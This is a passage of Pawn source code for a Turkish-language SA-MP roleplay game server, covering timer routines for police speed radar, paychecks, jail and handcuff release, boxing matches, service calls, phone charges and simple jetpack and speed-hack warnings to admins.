							PlayerInfo[playerid][pAGuns][1] = 0;
							PlayerInfo[playerid][pAGuns][2] = 0;
							PlayerInfo[playerid][pAGuns][3] = 0;
							PlayerInfo[playerid][pAGuns][4] = 0;
							PlayerInfo[playerid][pAGuns][5] = 0;
							PlayerInfo[playerid][pAGuns][6] = 0;
							PlayerInfo[playerid][pAGuns][7] = 0;
							PlayerInfo[playerid][pAGuns][8] = 0;
							PlayerInfo[playerid][pAGuns][9] = 0;
							PlayerInfo[playerid][pAGuns][10] = 0;
							PlayerInfo[playerid][pAGuns][11] = 0;
							SetPlayerWeapons(playerid);

							DeletePVar(playerid, "pbhealth");
							DeletePVar(playerid, "pbarmour");
		                }
		            }
	            }
            }
        }
	}
}

Timer:SpeedRadarTimer[3000]()
{
	foreach(Player, i) {
		if(playerTabbed[i] != 1 && IsACop(i) && RadarActive[i] == 1) {
			new Float:x, Float:y, Float:z, targetvehicle, string[68];
			foreach(Player, j) {
				if(IsPlayerInAnyVehicle(j) && j != i && GetPlayerVehicleSeat(j) == 0) {
					targetvehicle = GetPlayerVehicleID(j);
					if(IsVehicleStreamedIn(targetvehicle, i)) {
						GetPlayerPos(j, x, y, z);
						if(IsPlayerAimingAt(i, x, y, z, 10)) {
							RadarWarning[i] = 0;
							format(string, sizeof(string), "%s (ID: %i) ~n~Hiz: %.0f MPH", GetVehicleName(targetvehicle), j, fVehSpeed[j]);
							TextDrawSetString(RadarContext[i], string);
						}
					}
				}
			}
			if(RadarWarning[i] >= 2) { // 6 seconds
				TextDrawSetString(RadarContext[i], "Hiz Araniyor...");
			} else RadarWarning[i] ++;
		}
	}
}

// Timer Name: ServerHeartbeat()
// TickRate: 1 secs.
Timer:ServerHeartbeat[1000]()
{
	foreach(Player, i)
	{
		if(playerTabbed[i] != 1) switch(PlayerInfo[i][pLevel])
		{
			case 0 .. 2: PlayerInfo[i][pPayCheck] += 1;
			case 3 .. 4: PlayerInfo[i][pPayCheck] += 2;
			case 5 .. 6: PlayerInfo[i][pPayCheck] += 3;
			case 7 .. 8: PlayerInfo[i][pPayCheck] += 4;
			case 9 .. 10: PlayerInfo[i][pPayCheck] += 5;
			case 11 .. 12: PlayerInfo[i][pPayCheck] += 6;
			case 13 .. 14: PlayerInfo[i][pPayCheck] += 7;
			case 15 .. 16: PlayerInfo[i][pPayCheck] += 8;
			case 17 .. 18: PlayerInfo[i][pPayCheck] += 9;
			case 19 .. 20: PlayerInfo[i][pPayCheck] += 10;
			default: PlayerInfo[i][pPayCheck] += 11;
		}

		if(GetPVarType(i, "DistortAim") != 0) {
		    if(GetPlayerSurfingVehicleID(i) == INVALID_VEHICLE_ID) {
				DeletePVar(i, "DistortAim");
				SetPlayerDrunkLevel(i, 0);
			}
		}

		if(GetPlayerSurfingVehicleID(i) != INVALID_VEHICLE_ID && AdminDuty[i] == 0) {
		    if(GetVehicleSpeedByVehicleID(GetPlayerSurfingVehicleID(i)) > 7) {
			    if(GetPVarType(i, "DistortAim") == 0) {
					switch(GetVehicleModel(GetPlayerSurfingVehicleID(i))) {
					    case 422, 478, 543, 554, 600, 605, 607, 472, 473, 493, 595, 484, 430, 453, 452, 446, 454: {
							SetPVarInt(i, "DistortAim", 1);
							SetPlayerDrunkLevel(i, 35000);
						}
						default: {
						    GetPlayerPos(i, PlayerInfo[i][pPos_x], PlayerInfo[i][pPos_y], PlayerInfo[i][pPos_z]);
						    SetPlayerPos(i, PlayerInfo[i][pPos_x], PlayerInfo[i][pPos_y]+1.5, PlayerInfo[i][pPos_z]);
						    GameTextForPlayer(i, "~r~ Kaydin ve dustun", 1500, 3);
						}
					}
				}
			}
		}

		if(PlayerInfo[i][pJailed] > 0)
		{
			if(PlayerInfo[i][pJailTime] > 0)
			{
				if(playerTabbed[i] != 1)
				{
					PlayerInfo[i][pJailTime]--;
				}
			}
			if(PlayerInfo[i][pJailTime] <= 0)
			{
				PlayerInfo[i][pJailTime] = 0;
				if(PlayerInfo[i][pJailed] == 1)
				{
					SetPlayerInterior(i, 6);
					PlayerInfo[i][pInt] = 6;
					SetPlayerPos(i, 246.3764, 69.6958, 1003.6406);
					SetPlayerVirtualWorld(i, 20002);
					PlayerInfo[i][pVW] = 20002;
					SetPlayerFacingAngle(i, 180.0);
				}
				else if(PlayerInfo[i][pJailed] == 2)
				{
					SetPlayerInterior(i, 0);
					PlayerInfo[i][pInt] = 0;
					SetPlayerVirtualWorld(i, 0);
					PlayerInfo[i][pVW] = 0;
					SetPlayerPos(i,343.1081,-1521.4404,33.2985);
				}
				else if(PlayerInfo[i][pJailed] == 3)
				{
					SetPlayerInterior(i, 0);
					PlayerInfo[i][pInt] = 0;
					SetPlayerVirtualWorld(i, 0);
					PlayerInfo[i][pVW] = 0;
					SetPlayerPos(i,1529.6,-1691.2,13.3);

					strcpy(PlayerInfo[i][pPrisonedBy], "Nobody", 64);
					strcpy(PlayerInfo[i][pPrisonReason], "Yok", 64);
				}
				else if(PlayerInfo[i][pJailed] == 4)
				{
					SetPlayerInterior(i, 0);
					PlayerInfo[i][pInt] = 0;
					SetPlayerVirtualWorld(i, 0);
					PlayerInfo[i][pVW] = 0;
					SetPlayerPos(i,1529.6,-1691.2,13.3);
				}
				PlayerInfo[i][pJailed] = 0;
				PhoneOnline[i] = 0;
				SendClientMessage(i, COLOR_GRAD1,"Topluma olan borcunu ödedin.");
				GameTextForPlayer(i, "~g~Ozgursun!~n~~w~Daha iyi bir sivil olmayý dene.", 5000, 1);
				ClearCrime(i);
				SetPlayerToTeamColor(i);
			}
		}

		if(CommandSpamTimes[i] != 0)
		{
			CommandSpamTimes[i]--;
		}
		if(TextSpamTimes[i] != 0)
		{
			TextSpamTimes[i]--;
		}

		if(PlayerDragged[i] == 1) {
			if (PlayerDraggedBy[i] != INVALID_PLAYER_ID && IsCopDragging[PlayerDraggedBy[i]] == i) {
				if (!IsPlayerInAnyVehicle(i) && !IsPlayerInAnyVehicle(PlayerDraggedBy[i])) {
					new Float:gx,Float:gy,Float:gz;
					GetPlayerPos(PlayerDraggedBy[i], gx, gy, gz);
					Streamer_UpdateEx(i, gx, gy, gz);
					if (GetPlayerVirtualWorld(i) != GetPlayerVirtualWorld(PlayerDraggedBy[i])) {
						SetPlayerVirtualWorld(i,GetPlayerVirtualWorld(PlayerDraggedBy[i]));
						PlayerInfo[i][pVW] = GetPlayerVirtualWorld(PlayerDraggedBy[i]);
					}
					if (GetPlayerInterior(i) != GetPlayerInterior(PlayerDraggedBy[i])) {
						SetPlayerInterior(i,GetPlayerInterior(PlayerDraggedBy[i]));
						PlayerInfo[i][pInt] = GetPlayerInterior(PlayerDraggedBy[i]);
					}
					SetPlayerPos(i, gx, gy+1, gz);
					GameTextForPlayer(i, "SURUKLENIYORSUN...", 5000, 3);
				} else PlayerDragged[i] = 0;
			} else PlayerDragged[i] = 0;
		}

		if(IsPlayerInAnyVehicle(i))
		{
			if(GetPlayerState(i) == PLAYER_STATE_DRIVER) SetPlayerArmedWeapon(i, 0);
			else if(PlayerInfo[i][pGuns][4] == 0) SetPlayerArmedWeapon(i, 0);
			else SetPlayerArmedWeapon(i, 29);
		}

		if(InsideMainMenu[i] == 1) {
//		    new string[128];
		    //format(string, sizeof(string), "Online Oyuncular: %d", Iter_Count(Player));
		    //TextDrawSetString(MainMenuTxtdraw[7], string);
		}

		if(GetPlayerSpecialAction(i) == SPECIAL_ACTION_USEJETPACK && JetPack[i] == 0 && AdminDuty[i] != 1) {
			new string[74 + MAX_PLAYER_NAME];
		    format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d)  adlý oyuncu jetpack hilesi kullanýyor olabilir.", GetPlayerNameEx(i), i);
			ABroadCast(COLOR_YELLOW, string, 2);
			SetPVarInt(i, "jphW", GetPVarInt(i, "jphW")+1);

			if(GetPVarInt(i, "jphW") >= 3) {
				format(string, sizeof(string), "%s adlý oyuncu hile ile jetpack almýþ olabilir.", GetPlayerNameEx(i));
				AddAutomatedFlag(i, string);
				Log("logs/hack.log", string);
			}
		}

		if(GetPlayerState(i) == PLAYER_STATE_DRIVER && AdminDuty[i] != 1 && !IsAPlane(GetPlayerVehicleID(i))) {
  			new Float:fCurrentSpeed;
  			fCurrentSpeed = player_get_speed(i);
  			fVehSpeed[i] = fCurrentSpeed;
			if(fCurrentSpeed > 200) {
				new string[74 + MAX_PLAYER_NAME];
   				format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) adlý oyuncu hýz hilesi kullanýyor olabilir.(hýzý %d MPH'e kadar çýktý).", GetPlayerNameEx(i), i, fCurrentSpeed);
   				ABroadCast(COLOR_YELLOW, string, 2);
   				Log("logs/hizhilesi.log", string);
   				SetPVarInt(i, "shW", GetPVarInt(i, "shW")+1);

   				if(GetPVarInt(i, "shW") >= 3) {
	   				format(string, sizeof(string), "%s adlý oyuncu hiz hilesi olabilir.(hýzý %d MPH'e kadar çýktý).", GetPlayerNameEx(i), fCurrentSpeed);
	   				AddAutomatedFlag(i, string);
   				}
			}
		}

		if(UsedFind[i] >= 1)
			--UsedFind[i];

		if(FindTime[i] >= 1) {
			if(FindTime[i] == FindTimePoints[i]) {
				FindTime[i] = 0;
				FindTimePoints[i] = 0;
				SetPlayerMarkerForPlayer(i, FindingPlayer[i], 0xFFFFFF00);
				SetPlayerToTeamColor(FindingPlayer[i]);
				FindingPlayer[i] = -1;
				PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0);
				GameTextForPlayer(i, "~r~Kirmizi ikon kayboldu", 2500, 1);
			} else {
			    new string[32];
				format(string, sizeof(string), "%d", FindTimePoints[i] - FindTime[i]);
				GameTextForPlayer(i, string, 1500, 6);
				FindTime[i] += 1;
			}
		}

		if(CalledCops[i] >= 1)
		{
			if(CopsCallTime[i] < 1) { CopsCallTime[i] = 0; HidePlayerBeaconForCops(i); CalledCops[i] = 0; }
			else
			{
				CopsCallTime[i]--;
			}
		}
		if(CalledMedics[i] >= 1)
		{
			if(MedicsCallTime[i] < 1) { MedicsCallTime[i] = 0; HidePlayerBeaconForMedics(i); CalledMedics[i] = 0; }
			else
			{
				MedicsCallTime[i]--;
			}
		}

		if(NewbieTimer[i] > 0)
		{
			NewbieTimer[i]--;
		}
		if(GlobalChatTimer[i] > 0)
		{
			GlobalChatTimer[i]--;
		}
		if(JustReported[i] > 0)
		{
			JustReported[i]--;
		}
		if(TaxiCallTime[i] > 0)
		{
			if(TaxiAccepted[i] < 999)
			{
				if(IsPlayerConnected(TaxiAccepted[i]))
				{
					new Float:X,Float:Y,Float:Z;
					GetPlayerPos(TaxiAccepted[i], X, Y, Z);
					SetPlayerCheckpoint(i, X, Y, Z, 5);
				}
			}
		}
		if(EMSCallTime[i] > 0)
		{
			if(EMSAccepted[i] < INVALID_PLAYER_ID)
			{
				if(IsPlayerConnected(EMSAccepted[i]))
				{
					new Float:X,Float:Y,Float:Z;
					GetPlayerPos(EMSAccepted[i], X, Y, Z);
					new zone[MAX_ZONE_NAME];
					Get3DZone(X, Y, Z, zone, sizeof(zone));
					new string[128];
					format(string, sizeof(string), "Hastanýn þu anda olduðu yer %s.", zone);
					SetPlayerCheckpoint(i, X, Y, Z, 5);
				}
			}
		}

		if(BusCallTime[i] > 0)
		{
			if(BusAccepted[i] < 999)
			{
				if(IsPlayerConnected(BusAccepted[i]))
				{
					new Float:X,Float:Y,Float:Z;
					GetPlayerPos(BusAccepted[i], X, Y, Z);
					SetPlayerCheckpoint(i, X, Y, Z, 5);
				}
			}
		}
		if(MedicCallTime[i] > 0)
		{
			if(MedicCallTime[i] == 45) { MedicCallTime[i] = 0; DisablePlayerCheckpoint(i); PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0); GameTextForPlayer(i, "~r~Kirmizi ikon kayboldu", 2500, 1); }
			else
			{
			    new string[128];
				format(string, sizeof(string), "%d", 45 - MedicCallTime[i]);
				new Float:X,Float:Y,Float:Z;
				GetPlayerPos(MedicAccepted[i], X, Y, Z);
				SetPlayerCheckpoint(i, X, Y, Z, 5);
				GameTextForPlayer(i, string, 1500, 6);
				MedicCallTime[i] += 1;
			}
		}
		if(MechanicCallTime[i] > 0)
		{
			if(MechanicCallTime[i] == 30) { MechanicCallTime[i] = 0; DisablePlayerCheckpoint(i); PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0); GameTextForPlayer(i, "~r~Kirmizi ikon kayboldu", 2500, 1); }
			else
			{
			    new string[128];
				format(string, sizeof(string), "%d", 30 - MechanicCallTime[i]);
				GameTextForPlayer(i, string, 1500, 6);
				MechanicCallTime[i] += 1;
			}
		}

		if(PlayerInfo[i][pMechTime] > 0) PlayerInfo[i][pMechTime]--;
		if(PlayerInfo[i][pLawyerTime] > 0) PlayerInfo[i][pLawyerTime]--;
		if(PlayerInfo[i][pLawyerFreeTime] > 0) PlayerInfo[i][pLawyerFreeTime]--;
		if(PlayerInfo[i][pDrugsTime] > 0) PlayerInfo[i][pDrugsTime]--;


		if(PlayerInfo[i][pGCMuted] == 2 && PlayerInfo[i][pGCMutedTime] < 1)
		{
		    PlayerInfo[i][pGCMuted] = 0;
		}
		if(PlayerInfo[i][pGCMuted] > 1) PlayerInfo[i][pGCMutedTime]--;


		if(PlayerInfo[i][pRMuted] == 2 && PlayerInfo[i][pRMutedTime] < 1)
		{
		    PlayerInfo[i][pRMuted] = 0;
		}
		if(PlayerInfo[i][pRMuted] > 1) PlayerInfo[i][pRMutedTime]--;


		if(PlayerInfo[i][pCarTime] > 0)
		{
  			if(PlayerInfo[i][pCarTime] <= 0)
   			{
      			PlayerInfo[i][pCarTime] = 0;
		    }
		    else
		    {
      			PlayerInfo[i][pCarTime] -= 1;
		    }
		}

		if(PlayerInfo[i][pSexTime] > 0)
		{
			if(PlayerInfo[i][pSexTime] <= 0)
			{
				PlayerInfo[i][pSexTime] = 0;
			}
			else
			{
				PlayerInfo[i][pSexTime] -= 1;
			}
		}

		if(WantLawyer[i] >= 1)
		{
			CallLawyer[i] = 111;
			if(WantLawyer[i] == 1)
			{
				SendClientMessage(i, COLOR_LIGHTRED, "Avukat istiyor musun? (evet yada hayir yaz");
			}
			WantLawyer[i] ++;
			if(WantLawyer[i] == 8)
			{
				SendClientMessage(i, COLOR_LIGHTRED, "Avukat istiyor musun? (evet yada hayir yaz");
			}
			if(WantLawyer[i] == 15)
			{
				SendClientMessage(i, COLOR_LIGHTRED, "Avukat istiyor musun? (evet yada hayir yaz");
			}
			if(WantLawyer[i] == 20)
			{
				SendClientMessage(i, COLOR_LIGHTRED, "Senin için artýk avukat izni yok.");
				WantLawyer[i] = 0;
				CallLawyer[i] = 0;
			}
		}

		if(PlayerStoned[i] >= 3)
		{
			PlayerStoned[i] += 1;
			SetPlayerDrunkLevel(i, 40000);
			if(PlayerStoned[i] == 50)
			{
				PlayerStoned[i] = 0;
				SetPlayerDrunkLevel(i, 0);
				SendClientMessage(i, COLOR_GRAD1, "Artik sarhos degilsin!");
			}
		}

		if(BoxWaitTime[i] > 0)
		{
			if(BoxWaitTime[i] >= BoxDelay)
			{
				BoxDelay = 0;
				BoxWaitTime[i] = 0;
				PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
				GameTextForPlayer(i, "~g~Mac Basladi", 5000, 1);
				TogglePlayerControllable(i, 1);
				RoundStarted = 1;
			}
			else
			{
				new string[32];
				format(string, sizeof(string), "%d", BoxDelay - BoxWaitTime[i]);
				GameTextForPlayer(i, string, 1500, 6);
				BoxWaitTime[i] += 1;
			}
		}
		if(RoundStarted > 0)
		{
			if(PlayerBoxing[i] > 0)
			{
				new trigger = 0;
				new Lost = 0;
				new Float:angle;
				new Float:health;
				GetPlayerHealth(i, health);
				if(health < 12)
				{
					if(i == Boxer1) { Lost = 1; trigger = 1; }
					else if(i == Boxer2) { Lost = 2; trigger = 1; }
				}
				if(health < 28) { GetPlayerFacingAngle(i, angle); SetPlayerFacingAngle(i, angle + 85); }
				if(trigger)
				{
					new string[128];
					new winner[MAX_PLAYER_NAME];
					new loser[MAX_PLAYER_NAME];
					if(Lost == 1)
					{
						if(IsPlayerConnected(Boxer1) && IsPlayerConnected(Boxer2))
						{
							if(IsPlayerInRangeOfPoint(Boxer1,25.0,765.952270, 4.167977, 1000.719238) || IsPlayerInRangeOfPoint(Boxer2,25.0,765.952270, 4.167977, 1000.719238))
							{
								SetPlayerPos(Boxer1, 765.952270, 4.167977, 1000.719238); SetPlayerPos(Boxer2, 765.952270, 4.167977, 1000.719238);
								SetPlayerInterior(Boxer1, 5); SetPlayerInterior(Boxer2, 5);
								GetPlayerName(Boxer1, loser, sizeof(loser));
								GetPlayerName(Boxer2, winner, sizeof(winner));
								SetPlayerWeapons(Boxer1);
								SetPlayerWeapons(Boxer2);
								if(PlayerInfo[Boxer1][pJob] == 12 || PlayerInfo[Boxer1][pJob2] == 12) { PlayerInfo[Boxer1][pLoses] += 1; }
								if(PlayerInfo[Boxer2][pJob] == 12 || PlayerInfo[Boxer1][pJob2] == 12) { PlayerInfo[Boxer2][pWins] += 1; }
								format(string, sizeof(string), "%s ile yaptýðýn maçý kaybettin.", winner);
								SendClientMessage(Boxer1, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(Boxer1, "~r~Kaybettin", 3500, 1);
								format(string, sizeof(string), "%s ile yaptýðýn maçý kazandýn.", loser);
								SendClientMessage(Boxer2, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(Boxer2, "~r~You won", 3500, 1);
								if(GetPlayerHealth(Boxer1, health) < 20)
								{
									SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "Maçtan dolayý kendini bitkin hissediyorsun, git birþeyler iç.");
									SetPlayerHealth(Boxer1, 30.0);
								}
								else
								{
									SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "Maç yapmýþ olsan bile, kendini çok iyi hissediyorsun.");
									SetPlayerHealth(Boxer1, 50.0);
								}
								if(GetPlayerHealth(Boxer2, health) < 20)
								{
									SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "Maçtan dolayý kendini bitkin hissediyorsun, git birþeyler iç.");
									SetPlayerHealth(Boxer2, 30.0);
								}
								else
								{
									SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "Maç yapmýþ olsan bile, kendini çok iyi hissediyorsun.");
									SetPlayerHealth(Boxer2, 50.0);
								}
								GameTextForPlayer(Boxer1, "~g~Mac sona erdi", 5000, 1); GameTextForPlayer(Boxer2, "~g~Mac sona erdi", 5000, 1);

								if(PlayerInfo[Boxer2][pJob] == 12 || PlayerInfo[Boxer2][pJob2] == 12) {
								    #if defined DOUBLE_EXP_ENABLED
										new hour,minuite,second;
										gettime(hour,minuite,second);
										if(DoubleEXPcheck(hour))
										{
	 							 			PlayerInfo[Boxer2][pBoxSkill] += 2;
	    									SendClientMessage(Boxer2, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
										}
										else
										{
											SendClientMessage(Boxer2, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
											PlayerInfo[Boxer2][pBoxSkill]++;
										}
									#else
									    PlayerInfo[Boxer2][pBoxSkill]++;
									#endif
								}

								PlayerBoxing[Boxer1] = 0;
								PlayerBoxing[Boxer2] = 0;
							}
						}
					}
					else if(Lost == 2)
					{
						if(IsPlayerConnected(Boxer1) && IsPlayerConnected(Boxer2))
						{
							if(IsPlayerInRangeOfPoint(Boxer1,25.0,765.952270, 4.167977, 1000.719238) || IsPlayerInRangeOfPoint(Boxer2,25.0, 765.952270, 4.167977, 1000.719238))
							{
								SetPlayerPos(Boxer1, 765.952270, 4.167977, 1000.719238); SetPlayerPos(Boxer2, 765.952270, 4.167977, 1000.719238);
								SetPlayerInterior(Boxer1, 5); SetPlayerInterior(Boxer2, 5);
								GetPlayerName(Boxer1, winner, sizeof(winner));
								GetPlayerName(Boxer2, loser, sizeof(loser));
								SetPlayerWeapons(Boxer1);
								SetPlayerWeapons(Boxer2);
								if(PlayerInfo[Boxer2][pJob] == 12 || PlayerInfo[Boxer2][pJob2] == 12) { PlayerInfo[Boxer2][pLoses] += 1; }
								if(PlayerInfo[Boxer1][pJob] == 12 || PlayerInfo[Boxer1][pJob2] == 12) { PlayerInfo[Boxer1][pWins] += 1; }
								format(string, sizeof(string), "%s ile yaptýðýn maçý kaybettin.", winner);
								SendClientMessage(Boxer2, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(Boxer2, "~r~Kaybettin", 3500, 1);
								format(string, sizeof(string), "%s ile yaptýðýn maçý kazandýn.", loser);
								SendClientMessage(Boxer1, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(Boxer1, "~g~Kazandin", 3500, 1);
								if(GetPlayerHealth(Boxer1, health) < 20)
								{
									SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "Maçtan dolayý kendini bitkin hissediyorsun, git birþeyler iç.");
									SetPlayerHealth(Boxer1, 30.0);
								}
								else
								{
									SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "Maç yapmýþ olsan bile, kendini çok iyi hissediyorsun.");
									SetPlayerHealth(Boxer1, 50.0);
								}
								if(GetPlayerHealth(Boxer2, health) < 20)
								{
									SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "Maçtan dolayý kendini bitkin hissediyorsun, git birþeyler iç.");
									SetPlayerHealth(Boxer2, 30.0);
								}
								else
								{
									SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "Maç yapmýþ olsan bile, kendini çok iyi hissediyorsun.");
									SetPlayerHealth(Boxer2, 50.0);
								}
								GameTextForPlayer(Boxer1, "~g~Mac sona erdi", 5000, 1); GameTextForPlayer(Boxer2, "~g~Mac sona erdi", 5000, 1);

					   			#if defined DOUBLE_EXP_ENABLED
									new hour,minuite,second;
									gettime(hour,minuite,second);
									if(DoubleEXPcheck(hour)){
										PlayerInfo[Boxer1][pBoxSkill] += 2;
	    								SendClientMessage(Boxer2, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
									}
									else {
										SendClientMessage(Boxer2, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
										PlayerInfo[Boxer1][pBoxSkill]++;
									}
								#else
								    PlayerInfo[Boxer1][pBoxSkill]++;
								#endif

								PlayerBoxing[Boxer1] = 0;
								PlayerBoxing[Boxer2] = 0;
							}
						}
					}
					InRing = 0;
					RoundStarted = 0;
					Boxer1 = INVALID_PLAYER_ID;
					Boxer2 = INVALID_PLAYER_ID;
					trigger = 0;
				}
			}
		}

		if(PlayerCuffed[i] == 1)
		{
			if(PlayerCuffedTime[i] <= 0)
			{
				//Frozen[i] = 0;
				SetPVarInt(i, "IsFrozen", 0);
				TogglePlayerControllable(i, 1);
				PlayerCuffed[i] = 0;
				SetPVarInt(i, "PlayerCuffed", 0);
				PlayerCuffedTime[i] = 0;
				ClearAnimations(i, 1);
				SetPlayerSkin(i, GetPlayerSkin(i));
				SetPlayerSpecialAction(i, SPECIAL_ACTION_NONE);
				new Float:X, Float:Y, Float:Z;
				GetPlayerPos(i, X, Y, Z);
				SetPlayerPos(i, X, Y, Z);
				if(PlayerDraggedBy[i] != INVALID_PLAYER_ID) {
					IsCopDragging[PlayerDraggedBy[i]] = INVALID_PLAYER_ID;
					PlayerDragged[i] = 0;
					PlayerDraggedBy[i] = INVALID_PLAYER_ID;
				}
				if(IsPlayerAttachedObjectSlotUsed(i, 0))
					RemovePlayerAttachedObject(i, 0);
			}
			else
			{
				PlayerCuffedTime[i] -= 1;
			}
		}
		if(PlayerCuffed[i] == 2)
		{
			if(PlayerCuffedTime[i] <= 0)
			{
				new Float:X, Float:Y, Float:Z;
				GetPlayerPos(i, X, Y, Z);
				new copinrange;
				foreach(Player, j)
				{
					if(IsPlayerInRangeOfPoint(j, 30, X, Y, Z) && IsACop(j))
					{
						copinrange = 1;
					}
				}

				if(copinrange == 0)
				{
					//Frozen[i] = 0;
					ClearAnimations(i, 1);
					SetPlayerSpecialAction(i, SPECIAL_ACTION_NONE);
					DeletePVar(i, "IsFrozen");
					GameTextForPlayer(i, "~r~Kelepceden kurtuldun, ozgursun!", 2500, 3);

				 	if(IsPlayerAttachedObjectSlotUsed(i, 0))
						RemovePlayerAttachedObject(i, 0);

					TogglePlayerControllable(i, 1);
					PlayerCuffed[i] = 0;
					DeletePVar(i, "PlayerCuffed");
					PlayerCuffedTime[i] = 0;
					if(PlayerDraggedBy[i] != INVALID_PLAYER_ID) {
						IsCopDragging[PlayerDraggedBy[i]] = INVALID_PLAYER_ID;
						PlayerDragged[i] = 0;
						PlayerDraggedBy[i] = INVALID_PLAYER_ID;
					}

					new string[76];
					format(string, sizeof(string), "%s adlý kiþi kelepçelerinden kurtulmayý baþardý.", GetPlayerNameEx(i));
					ProxDetector(30.0, i, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				else
				{
					PlayerCuffedTime[i] = 60;
				}
			}
			else
			{
				PlayerCuffedTime[i] -= 1;
			}
		}

		if(TransportDriver[i] < 999 && AdminDuty[i] == 0)
		{
			if(GetPlayerVehicleID(i) != GetPlayerVehicleID(TransportDriver[i]) || !TransportDuty[TransportDriver[i]])
			{
				if(IsPlayerConnected(TransportDriver[i]))
				{
					TransportMoney[TransportDriver[i]] += TransportCost[i];
					TransportTime[TransportDriver[i]] = 0;
					TransportCost[TransportDriver[i]] = 0;
					new string[36];
					format(string, sizeof(string), "~w~Musteri ayrildi~n~~g~$%d kazanildi",TransportCost[i]);
					GameTextForPlayer(TransportDriver[i], string, 5000, 1);
					TransportDriver[i] = 999;
				}
			}
			else if(TransportTime[i] >= 16 && AdminDuty[i] == 0)
			{
				TransportTime[i] = 1;
				if(TransportDriver[i] < 999)
				{
					if(IsPlayerConnected(TransportDriver[i]))
					{
	  					TransportCost[i] += TransportValue[TransportDriver[i]];
						TransportCost[TransportDriver[i]] = TransportCost[i];
					}
				}
			}
			TransportTime[i] += 1;
			new string[24];
			format(string, sizeof(string), "~r~%d ~w~: ~g~$%d",TransportTime[i],TransportCost[i]);
			GameTextForPlayer(i, string, 15000, 6);
			if(TransportCost[i] > GetPlayerCash(i))
			{
			    RemovePlayerFromVehicle(i);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(i, slx, sly, slz);
				SetPlayerPos(i, slx, sly, slz + 2);
			    GameTextForPlayer(i, "~r~Paran kalmadi", 4000, 4);
			}
		}
	// end
	}
}

// Timer Name: ServerHeartbeatTwo()
// TickRate: 1 secs.
Timer:ServerHeartbeatTwo[1000]()
{
	foreach(Player, i)
	{
		if(CellTime[i] > 0)
		{
			if(CellTime[i] == cchargetime)
			{
				CellTime[i] = 1;
				if(Mobile[Mobile[i]] == i)
				{
					CallCost[i] += callcost;
				}
			}
			CellTime[i]++;
			if(Mobile[Mobile[i]] == INVALID_PLAYER_ID && CellTime[i] == 5)
			{
				if(IsPlayerConnected(Mobile[i]))
				{
				    new Float:rX, Float:rY, Float:rZ;
				    GetPlayerPos(i, rX, rY, rZ);
					new string[18 + MAX_PLAYER_NAME];
					format(string, sizeof(string), "%s adlý kiþinin telefonu çalýyor.", GetPlayerNameEx(Mobile[i]));
					ProxDetector(30.0, Mobile[i], string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
			}
		}
		if(CellTime[i] == 0 && CallCost[i] > 0)
		{
			new string[28];
			format(string, sizeof(string), "~w~Cagri Ucreti~n~~r~$%d",CallCost[i]);
			GivePlayerCash(i, -CallCost[i]);
			GameTextForPlayer(i, string, 5000, 1);
			CallCost[i] = 0;
		}
  		if(GetPVarType(i, "Injured"))
	    {
	        SetPlayerArmedWeapon(i, 0);
	        if(GetPVarInt(i, "EMSAttempt") == -1 || GetPVarInt(i, "EMSAttempt") == 1 || GetPVarInt(i, "EMSAttempt") == 2)
	        {
				if(!IsPlayerInRangeOfPoint(i, 3.0, GetPVarFloat(i,"MedicX"), GetPVarFloat(i,"MedicY"), GetPVarFloat(i,"MedicZ")))
				{
					SendClientMessage(i, COLOR_WHITE, "Kendinden geçmiþ bir þekildeydin, acilen hastaneye getirildin.");
 					KillEMSQueue(i);
					SpawnPlayer(i);
				}
			}
		}
		if(GetPVarInt(i, "rccam") == 0)
 		{
			if(GetVehicleModel(GetPlayerVehicleID(i)) != 594)
			{
	 			DestroyVehicle(GetPVarInt(i, "rcveh"));
	 			VehicleRadioStation[GetPVarInt(i, "rcveh")] = 0;
	     		KillTimer(GetPVarInt(i, "rccamtimer"));
			}
		}
		if(IsPlayerInRangeOfPoint(i,2.0,1544.2,-1353.4,329.4))
		{ // Startower parachute
            if(PlayerInfo[i][pGuns][11] != 46)
            {
		    	GivePlayerValidWeapon(i, 46, 99999);
			}
		}
		if(GetPlayerState(i) == PLAYER_STATE_ONFOOT) for(new h = 0; h < sizeof(FamilyInfo); h++)
		{
			if(IsPlayerInRangeOfPoint(i, 2.0, FamilyInfo[h][FamilySafe][0], FamilyInfo[h][FamilySafe][1], FamilyInfo[h][FamilySafe][2]))
			{
				if(FamilyInfo[h][FamilyUSafe] == 1)
				{
					GameTextForPlayer(i, "~y~Aile kasasi~w~~n~Bilgi almak icin ~r~/ailekasayardim~w~ yaz", 5000, 3);
				}
			}
		}
		for(new h = 0; h < sizeof(Points); h++)
		{
			if(IsPlayerInRangeOfPoint(i, 2.0, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz]))
			{
				if(Points[h][Type] == 1 && GetPVarInt(i, "Packages") == 0)
				{
